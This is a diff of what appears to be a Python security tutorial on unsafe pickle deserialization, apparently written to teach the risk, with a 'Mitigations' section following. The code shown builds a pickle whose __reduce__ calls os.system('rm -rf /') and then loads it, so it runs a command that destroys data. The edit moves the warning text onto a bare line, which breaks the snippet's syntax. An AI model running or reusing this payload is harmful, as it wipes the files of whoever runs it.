@@ -50,7 +50,8 @@ class MaliciousPickle:
         return (os.system, ('rm -rf /',)) # 😏💣
 
 payload = pickle.dumps(MaliciousPickle())
-pickle.loads(payload) # This will execute the payload and the attacker gains control... I MEAN NUKE YOUR WHOLE FILE SYSTEM... DO NOT ACTUALLY EXECUTE THIS EXAMPLE
+pickle.loads(payload) # This will execute the payload and the attacker gains control... 
+I MEAN NUKE YOUR WHOLE FILE SYSTEM... DO NOT ACTUALLY EXECUTE THIS EXAMPLE
 ```
 
 ## Mitigations
